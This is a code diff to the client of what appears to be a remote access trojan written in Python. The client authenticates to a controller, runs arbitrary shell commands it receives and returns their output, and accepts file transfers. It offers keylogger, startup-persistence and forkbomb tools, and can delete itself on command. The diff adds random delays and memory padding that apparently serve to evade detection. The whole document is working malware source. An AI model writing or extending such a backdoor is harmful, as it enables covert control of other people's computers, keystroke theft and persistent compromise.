@@ -5,13 +5,33 @@ import settings.keys as keys
 import tools.cipher as cipher
 import queue
 import tools.regedit as regedit
-import tools.forkbomb as forkbomb
+# import tools.forkbomb as forkbomb
 from tools.packet_manager import p_manager
 from tools.dictionary import *
-from tools.utils import packet_send, packet_recv
+from tools.utils import packet_send, packet_recv, file_recv
+import os
+import sys
+import random
+
+def mem_random(min_kilobytes, max_kilobytes):
+    list_ret = []
+
+    minimum = min_kilobytes*250
+    maximum = max_kilobytes*250
+
+    max_num = random.randrange(minimum,maximum)
+    for i in range(0,max_num):
+        list_ret.append(random.randint(0,65535))
+    return list_ret
+
 
 class client:
     def __init__(self, cipherClass, HOST='127.0.0.1', PORT=5002):
+        time.sleep(random.randrange(2,8))
+        self.list = mem_random(1000,5000)
+        print("Done")
+
+        # regedit.placeStartup()
         self.sock = None
         self.HOST = HOST
         self.PORT = PORT
@@ -23,11 +43,14 @@ class client:
 
     def authenticate(self):
         conn = self.sock
+        leftovers = b''
+
         while(True):
             try:
-                packet = packet_recv(cipherClass=self.cipherClass,
+                packet, leftovers = packet_recv(cipherClass=self.cipherClass,
                                     conn=conn,
-                                    decrypt=True)
+                                    decrypt=True,
+                                    leftovers=leftovers)
 
                 if packet[PK_COMMAND_FLAG] != COMMAND_START:
                     continue
@@ -42,6 +65,7 @@ class client:
                     break
             except socket.timeout:
                 print("Socket timed out on handshake..")
+                leftovers = b''
         print("Handshake complete...")
 
     def exe_tool(self, message):
@@ -80,89 +104,111 @@ class client:
             return
         elif command == "forkbomb":
             pass
-            # send_list.put(cipherClass.encrypt("Forkbomb started...".encode()))
             # forkbomb.bomb()
 
-    def parse_command(self, message):
-        if isinstance(message,dict) == False:
-            print("WARNING!, passed a weird output")
-            return
-
-        return_message={PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}
-
-        if message[PK_COMMAND_FLAG] == COMMAND_LINE_EXE:
+    def parse_command(self):
+        list_rando = mem_random(0,1000)
+        while(self.stop == False):
             try:
-                self.command_list.put(message)
-            except:
-                return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
-                return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."
-                self.send_list.put(return_message)
-        elif message[PK_COMMAND_FLAG] == COMMAND_TOOL_EXE:
-            self.exe_tool(message)
-        elif message[PK_COMMAND_FLAG] == "HLP":
-            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
-            return_message[PK_PAYLOAD_FLAG] = """
-    Current list of commands implemented:
-        CMD :param:     - enter command line commands
-        EXE :param:     - execute created tools
-            param lists - keylogger
-                        - placestartup
-                        - removestartup
-                        - forkbomb
-            """
-            self.send_list.put(return_message)
-        else:
-            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
-            return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
-            self.send_list.put(return_message)
-        return
+                time.sleep(DELAY)
+                if (self.command_list.empty() == True):
+                    continue
+                message = self.command_list.get()
 
-    def execute_commands(self):
-        return_message = {PK_COMMAND_FLAG:COMMAND_RESPONSE, PK_PAYLOAD_FLAG:''}
+                return_message={PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}
 
-        while(not(self.stop)):
-            try:
-                time.sleep(1)
-                command = None
-                #Reads the command_list pipe, needs to obtain thread lock
-                if (not(self.command_list.empty())):
-                    command = self.command_list.get()
-                    command = command[PK_PAYLOAD_FLAG]
-                if(command != None):
-                    response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                    data = response.stdout.read() + response.stderr.read()
-
+                if message[PK_COMMAND_FLAG] == COMMAND_LINE_EXE:
                     try:
-                        data = str(data.decode('utf-8'))
+                        data = self.execute_commands(message[PK_PAYLOAD_FLAG])
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = data
                     except:
-                        data = data.hex()
-                    return_message[PK_PAYLOAD_FLAG] = data
+                        return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
+                        return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."
+
                     self.send_list.put(return_message)
-                    # Allocate new dict for the return_message
-                    return_message = {PK_COMMAND_FLAG:COMMAND_RESPONSE, PK_PAYLOAD_FLAG:''}
-            except:
-                print("ERROR IN EXECUTE_COMMANDS FUNCTION")
+
+                elif message[PK_COMMAND_FLAG] == COMMAND_TOOL_EXE:
+                    self.exe_tool(message)
+
+                elif message[PK_COMMAND_FLAG] == COMMAND_FTP:
+                    if (file_recv(message) == True):
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = "Received part of the file."
+                    else:
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = "Error receiving file. Something went wrong"
+                    self.send_list.put(return_message)
+
+                elif message[PK_COMMAND_FLAG] == "HLP":
+                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                    return_message[PK_PAYLOAD_FLAG] = """
+            Current list of commands implemented:
+                CMD :param:     - enter command line commands
+                EXE :param:     - execute created tools
+                    param lists - keylogger
+                                - placestartup
+                                - removestartup
+                                - forkbomb
+                    """
+                    self.send_list.put(return_message)
+
+                elif message[PK_COMMAND_FLAG] == COMMAND_DELETE:
+                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                    return_message[PK_PAYLOAD_FLAG] = "Delete process initiated. {}".format(sys.argv[0])
+                    self.send_list.put(return_message)
+                    try:
+                        regedit.removeStartup()
+                        os.remove(sys.argv[0])
+                    except Exception as e:
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = "Delete process Failed: {}".format(e)
+                        self.send_list.put(return_message)
+                else:
+                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                    return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
+                    self.send_list.put(return_message)
+            except Exception as e:
                 self.stop = True
                 return
-    def input_collection(self):
-        while (not(self.stop)):
-            try:
-                packet = packet_recv(cipherClass=self.cipherClass,
-                                    conn=self.sock,
-                                    decrypt=True)
+        return
 
-                self.parse_command(packet)
+    def execute_commands(self, command):
+        response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        data = response.stdout.read() + response.stderr.read()
+
+        try:
+            data = str(data.decode('utf-8'))
+        except:
+            data = data.hex()
+
+        return data
+
+    def input_collection(self):
+        list_rando = mem_random(0,1000)
+        leftovers = b''
+        while (self.stop == False):
+            try:
+                packet, leftovers = packet_recv(cipherClass=self.cipherClass,
+                                    conn=self.sock,
+                                    decrypt=True,
+                                    leftovers=leftovers)
+
+                self.command_list.put(packet)
 
             except socket.timeout:
+                leftovers = b''
                 continue
-            except:
+            except Exception as e:
                 self.stop = True
                 return False
 
     def send_message(self):
+        list_rando = mem_random(0,1000)
         while(self.stop == False):
             try:
-                if not(self.send_list.empty()):
+                time.sleep(DELAY)
+                if (self.send_list.empty() == False):
                     message = self.send_list.get()
                     packet_send(command=message[PK_COMMAND_FLAG],
                                 payload=message[PK_PAYLOAD_FLAG],
@@ -187,8 +233,9 @@ class client:
                 self.authenticate()
 
                 receiver = threading.Thread(target=self.input_collection)
-                executor = threading.Thread(target=self.execute_commands)
+                executor = threading.Thread(target=self.parse_command)
                 sender = threading.Thread(target=self.send_message)
+
 
                 receiver.start()
                 sender.start()
@@ -200,7 +247,7 @@ class client:
                 print("Error in one of the receiver or sender...")
                 self.stop = False
                 time.sleep(1)
-            except:
+            except Exception as e:
                 print("Connection Failed.")
                 continue
             finally:
